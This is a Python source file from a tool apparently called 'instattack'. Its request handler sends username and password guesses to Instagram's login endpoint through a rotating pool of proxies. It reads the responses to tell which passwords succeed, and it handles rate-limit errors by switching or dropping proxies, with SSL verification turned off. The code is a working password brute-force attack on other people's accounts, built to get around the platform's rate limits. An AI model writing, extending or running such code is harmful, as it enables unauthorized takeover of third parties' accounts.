import aiohttp
import asyncio

from instattack import logger
from instattack import settings

from instattack.src.exceptions import ClientResponseError
from instattack.src.base import Handler
from instattack.src.login import constants

from .exceptions import InvalidResponseJson, InstagramResultError, ClientTooManyRequests
from .models import InstagramResult
from .utils import get_token


class ProxyErrorHandlerMixin(object):

    async def handle_proxy_error(self, e, proxy, scheduler, extra=None, treatment=None):
        """
        [1] Fatal Error:
        ---------------
        If `remove_invalid_proxy` is set to True and this error occurs,
        the proxy will be removed from the database.
        If `remove_invalid_proxy` is False, the proxy will just be noted
        with the error and the proxy will not be put back in the pool.

        Since we will not delete directly from this method (we need config)
        we will just note the error.

        [2] Inconclusive Error:
        ----------------------
        Proxy will not be noted with the error and the proxy will be put
        back in pool.

        [3] Semi-Fatal Error:
        --------------------
        Regardless of the value of `remove_invalid_proxy`, the  proxy
        will be noted with the error and the proxy will be removed from
        the pool.

        [4] General Error:
        -----------------
        Proxy will be noted with error but put back in the pool.

        TODO
        ----
        Only remove proxy if the error has occured a certain number of times, we
        should allow proxies to occasionally throw a single error.
        """
        log = logger.get_async(self.__name__, subname='handle_proxy_error')
        log.disable_on_false(self.log_attempts)

        extra = extra or {}
        extra['proxy'] = proxy
        log.error(e, extra=extra)

        # Allow Manual Treatments
        await proxy.handle_error(e, treatment=treatment)

        # Allow Manual Treatments
        if not treatment:
            treatment = proxy.get_error_treatment(e)

        if treatment == 'fatal':
            if self.remove_proxy_on_error:
                log.error(e, extra={'other': 'Removing Proxy', 'proxy': proxy})
                await scheduler.spawn(proxy.delete())
            else:
                await scheduler.spawn(proxy.save())

        elif treatment in ('semifatal', 'error'):
            if treatment == 'error':
                await self.proxy_handler.pool.put(proxy)

            await scheduler.spawn(proxy.save())

        elif treatment == 'inconclusive':
            # Do not need to save...
            await self.proxy_handler.pool.put(proxy)


class RequestHandler(Handler, ProxyErrorHandlerMixin):

    def __init__(self, config, proxy_handler, **kwargs):
        super(RequestHandler, self).__init__(**kwargs)
        self.proxy_handler = proxy_handler

        self._headers = None
        self._cookies = None
        self._token = None

        self.log_attempts = config['attempts']['log']

        self.limit = config['connection']['limit']
        self.timeout = config['connection']['timeout']
        self.limit_per_host = config['connection']['limit_per_host']

        self.remove_proxy_on_error = config.get('remove_proxy_on_error', False)

    @property
    def _connector(self):
        return aiohttp.TCPConnector(
            ssl=False,
            force_close=True,
            limit=self.limit,
            limit_per_host=self.limit_per_host,
            enable_cleanup_closed=True,
        )

    @property
    def _timeout(self):
        return aiohttp.ClientTimeout(
            total=self.timeout
        )

    def _login_data(self, password):
        return {
            constants.INSTAGRAM_USERNAME_FIELD: self.user.username,
            constants.INSTAGRAM_PASSWORD_FIELD: password
        }

    @property
    def headers(self):
        return self._headers

    @property
    def token(self):
        return self._token

    async def cookies(self):
        if not self._cookies:
            # TODO: Set timeout to the token timeout.
            sess = aiohttp.ClientSession(connector=self._connector)
            self._token, self._cookies = await get_token(sess)

            if not self._token:
                raise RuntimeError('Could not find token.')

            self._headers = settings.HEADERS(self._token)
            await sess.close()

        return self._cookies

    async def parse_response_result(self, result, password, proxy):
        """
        Raises an exception if the result that was in the response is either
        non-conclusive or has an error in it.

        If the result does not have an error and is non conslusive, than we
        can assume that the proxy was most likely good.
        """
        result = InstagramResult.from_dict(result, proxy=proxy, password=password)
        if result.has_error:
            raise InstagramResultError(result.error_message)
        else:
            if not result.conclusive:
                raise InstagramResultError("Inconslusive result.")
            return result

    async def parse_client_response(self, response, password, proxy):
        """
        Takes the AIOHttp ClientResponse and tries to return a parsed
        InstagramResult object.

        For AIOHttp sessions and client responses, we cannot read the json
        after response.raise_for_status() has been called.

        Since a 400 response will have valid json that can indicate an authentication,
        via a `checkpoint_required` value, we cannot raise_for_status until after
        we try to first get the response json.
        """
        log = logger.get_async(self.__name__, subname='handle_request_error')
        log.disable_on_false(self.log_attempts)

        if response.status == 400:
            try:
                json = await response.json()
            except ValueError:
                raise InvalidResponseJson(response)
            else:
                return await self.parse_response_result(json, password, proxy)
        else:
            try:
                response.raise_for_status()
            except (
                aiohttp.ClientResponseError,
            ) as e:
                if response.status == 429:
                    raise ClientTooManyRequests(response)
                else:
                    raise ClientResponseError(response)
            else:
                try:
                    json = await response.json()
                except ValueError:
                    raise InvalidResponseJson(response)
                else:
                    return await self.parse_response_result(json, password, proxy)

    async def handle_response_error(self, e, proxy, scheduler, response=None):
        await self.handle_proxy_error(e, proxy, scheduler, extra={
            'response': response
        })

    async def handle_request_error(self, e, proxy, scheduler):
        """
        For errors related to proxy connectivity issues, and the validity of
        the proxy, we remove the proxy entirely and don't note the error/put
        back in the pool.  For situations in which it is a client response
        error, i.e. a response was returned, we just note the error and put
        the proxy back in the pool.
        """
        log = logger.get_async(self.__name__, subname='handle_request_error')
        log.disable_on_false(self.log_attempts)

        if isinstance(e, RuntimeError):
            """
            RuntimeError: File descriptor 87 is used by transport
            <_SelectorSocketTransport fd=87 read=polling write=<idle, bufsize=0>>
            """
            await self.handle_proxy_error(e, proxy, scheduler, treatment='inconclusive')

        # Don't want to mark as inconclusive because we don't want to note
        # the last time the proxy was used.
        elif isinstance(e, asyncio.CancelledError):
            pass

        elif isinstance(e, ClientResponseError):
            await self.handle_response_error(e, proxy, scheduler)

        elif isinstance(e, (TimeoutError, ) + settings.REQUEST_ERRORS):
            await self.handle_proxy_error(e, proxy, scheduler)

        else:
            raise e

    async def login_request(self, loop, session, password, proxy, scheduler):
        """
        For a given password, makes a series of concurrent requests, each using
        a different proxy, until a result is found that authenticates or dis-
        authenticates the given password.

        TODO
        ----
        Only remove proxy if the error has occured a certain number of times, we
        should allow proxies to occasionally throw a single error.
        """
        log = logger.get_async(self.__name__, subname='login_request')
        log.disable_on_false(self.log_attempts)

        proxy.update_time()
        log.debug('Making Login Request', extra={
            'password': password,
            'proxy': proxy,
        })
        try:
            async with session.post(
                settings.INSTAGRAM_LOGIN_URL,
                headers=self.headers,
                data=self._login_data(password),
                ssl=False,
                proxy=proxy.url  # Only Http Proxies Are Supported by AioHTTP
            ) as response:
                try:
                    result = await self.parse_client_response(response, password, proxy)
                except Exception as e:
                    await self.handle_response_error(e, proxy, scheduler, response=response)
                else:
                    if not result:
                        raise RuntimeError("Handling client response should "
                            "not return null proxy.")

                    await proxy.handle_success()
                    await self.proxy_handler.pool.put(proxy)
                    await scheduler.spawn(proxy.save())
                    return result

        except Exception as e:
            await self.handle_request_error(e, proxy, scheduler)
